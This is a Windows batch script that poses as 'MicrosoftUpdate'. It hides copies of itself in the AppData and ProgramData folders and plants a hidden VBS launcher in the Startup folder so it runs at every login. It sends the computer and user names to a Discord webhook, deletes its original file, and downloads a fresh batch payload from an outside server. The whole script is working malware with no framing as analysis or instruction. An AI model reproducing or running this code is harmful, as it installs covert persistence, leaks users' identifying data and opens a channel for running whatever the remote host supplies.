@echo off
cls

set uz=zuiasd

if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%APPDATA%/MicrosoftUpdate/"
copy /y %~f0 "%AppData%\MicrosoftUpdate\"
)
if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
mkdir "%PROGRAMDATA%/MicrosoftUpdate/"
copy /y %~f0 "%PROGRAMDATA%\MicrosoftUpdate\"
)

if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set userauto=YES
)
if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
echo On Error Resume Next>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
echo Set WshShell = WScript.CreateObject( "WScript.Shell" ^)>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
echo WshShell.Run ^"^%APPDATA^%\MicrosoftUpdate\MicrosoftUpdate.bat^",0,True>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
echo WshShell.Run ^"^%PROGRAMDATA^%\MicrosoftUpdate\MicrosoftUpdate.bat^",0,True>>"%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs"
set userauto=YES NEW CREATED
)

if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set pcauto=YES
)
if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
set pcauto=NO NOT CREATED
)

set content=---------------------------\nPC: %ComputerName%\nUSER: %USERNAME%\nUSER-AUTOSTART: %userauto%\nPC-AUTOSTART: %pcauto%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1045852501590675476/fUqcJcCA2TNtHiOLTIrcBJgZDFD_BPWpPoyud-5z3ucLn2fNWquHobLnEiglQtOMwb3v

if %~f0 NEQ %APPDATA%/MicrosoftUpdate/%~n0%~x0 (
if %~f0 NEQ %PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0 (
del /f /q %~f0
))

curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%APPDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"
curl "https://freestream.us.to/schulprojekt/MicrosoftUpdate.bat" --output "%PROGRAMDATA%/MicrosoftUpdate/MicrosoftUpdate.bat"

exit
